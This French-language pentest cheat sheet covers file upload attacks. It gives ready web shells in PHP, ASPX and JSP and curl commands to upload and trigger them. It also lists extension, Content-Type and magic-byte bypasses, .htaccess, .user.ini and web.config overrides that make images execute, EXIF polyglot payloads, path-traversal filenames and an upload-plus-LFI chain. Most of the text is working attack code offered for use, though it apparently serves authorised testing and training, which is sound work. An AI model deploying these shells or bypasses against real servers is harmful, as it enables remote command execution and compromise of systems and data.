# 21 — File Upload Attacks

## Objectifs
Contourner les validations d'upload (extension, MIME, magic bytes, taille) pour déposer un web shell ou un fichier malveillant exécutable.

---

## 1. Reconnaissance

- Identifier le formulaire et la réponse (chemin de stockage, URL publique).
- Tester un fichier légitime pour voir le comportement.
- Vérifier si le fichier est servi directement ou via un script.
- Chercher : validation côté client ? côté serveur ? les deux ?

```bash
# Upload simple
curl -X POST http://<TARGET>/upload -F "file=@shell.php"
curl -X POST http://<TARGET>/upload -F "file=@shell.php" -F "submit=Upload"

# Voir la réponse (chemin)
curl -i -X POST http://<TARGET>/upload -F "file=@test.txt"
```

---

## 2. Web shells

```php
<?php system($_GET['c']); ?>
<?php echo shell_exec($_REQUEST['c']); ?>
<?php passthru($_GET['c']); ?>
<?php eval($_POST['c']); ?>
<?php $f='shell.php';file_put_contents($f,base64_decode($_POST['b'])); ?>
```

```aspx
<%@ Page Language="C#" %><% System.Diagnostics.Process.Start("cmd.exe","/c "+Request["c"]); %>
```

```jsp
<% if(request.getParameter("c")!=null){ Process p=Runtime.getRuntime().exec(request.getParameter("c")); } %>
```

```bash
# Usage
curl "http://<TARGET>/uploads/shell.php?c=id"
curl -X POST http://<TARGET>/uploads/shell.php -d "c=whoami"
```

---

## 3. Contournement d'extension

| Filtre | Bypass |
|---|---|
| `.php` interdit | `.php3 .php4 .php5 .phtml .phar .pgif` |
| Liste noire | `.pHp`, `.PhP5`, `.pht` |
| Double extension | `shell.php.jpg`, `shell.jpg.php` |
| Null byte | `shell.php%00.jpg` (anciens serveurs) |
| Espace / point final | `shell.php .`, `shell.php.` |
| Encodage | `shell%2ephp`, `shell.php%20` |
| Alternative | `.htaccess`, `.user.ini` |

```bash
# Fuzzer les extensions
ffuf -u "http://<TARGET>/upload" -X POST -F "file=@shell.FUZZ" -w extensions.txt -mr "success"
```

### .htaccess
```apache
AddType application/x-httpd-php .jpg
```
Uploader `.htaccess` puis `shell.jpg` contenant du PHP.

### .user.ini (PHP-FPM)
```ini
auto_prepend_file=shell.jpg
```

### web.config (IIS)
```xml
<configuration><system.webServer><handlers>
<add name="x" path="*.jpg" verb="*" modules="IsapiModule" scriptProcessor="C:\Windows\System32\inetsrv\asp.dll"/>
</handlers></system.webServer></configuration>
```

---

## 4. Contournement du Content-Type

```bash
# Original détecté → forcer
curl -X POST http://<TARGET>/upload -F "file=@shell.php;type=image/jpeg"

# Modifier dans Burp
Content-Type: image/jpeg
```

Extensions acceptées souvent : `image/jpeg`, `image/png`, `image/gif`, `application/pdf`.

---

## 5. Magic bytes

```bash
# Ajouter un header GIF/PNG/JPEG devant le code PHP
printf 'GIF89a' > shell.gif.php
cat shell.php >> shell.gif.php

printf '\x89PNG\r\n\x1a\n' > shell.png.php
cat shell.php >> shell.png.php

# Vérifier
file shell.gif.php
xxd shell.gif.php | head
```

### Polyglot image + PHP
```bash
exiftool -Comment='<?php system($_GET["c"]); ?>' image.jpg
# ou
convert image.jpg -set comment '<?php system($_GET["c"]); ?>' out.jpg
```

### Bypass getimagesize()
Le fichier doit être une image valide **et** contenir du PHP. Utiliser un vrai JPEG avec le code en commentaire EXIF, ou une image polyglotte.

---

## 6. Autres contournements

### Nom de fichier
```bash
# Traversée pour écrire hors du dossier upload
filename="../../var/www/html/shell.php"
filename="..%2f..%2fvar%2fwww%2fhtml%2fshell.php"

# Caractères spéciaux
shell.php%00.jpg
shell.php\x00.jpg
```

### Taille / type
- Zip bomb / fichier énorme → DoS (hors scope souvent)
- SVG avec JS → XSS stocké
- PDF avec JS embarqué

### Race condition
Upload d'un fichier temporaire puis suppression : inclure avant suppression (LFI + upload).

---

## 7. Après l'upload

```bash
# Localiser le fichier
curl -I http://<TARGET>/uploads/shell.php
gobuster dir -u http://<TARGET>/uploads -w common.txt

# Si exécution bloquée dans le dossier upload → LFI
?page=uploads/shell.jpg

# Si le nom est randomisé → réponse de l'upload / logs
```

### Upload + LFI
```bash
# 1. Uploder shell.jpg (avec PHP)
# 2. Inclure via LFI
curl "http://<TARGET>/?page=uploads/shell.jpg&c=id"
```

---

## 8. Outils

```bash
# Fuzzing du formulaire
ffuf -u http://<TARGET>/upload -X POST -F "file=@shell.php" -H "Content-Type: multipart/form-data" -mr "uploaded"

# Burp Intruder sur l'extension
# Payloads: php, php3, php4, php5, phtml, phar, pht, phps, jpg, jpeg, png, gif, svg
```

---

## Checklist
- [ ] Formulaire et traitement identifiés
- [ ] Validation client et serveur testées
- [ ] Extensions alternatives testées
- [ ] Content-Type et magic bytes contournés
- [ ] `.htaccess` / `.user.ini` / `web.config` testés
- [ ] Chemin de stockage localisé
- [ ] Exécution confirmée
- [ ] Nettoyage des fichiers uploadés
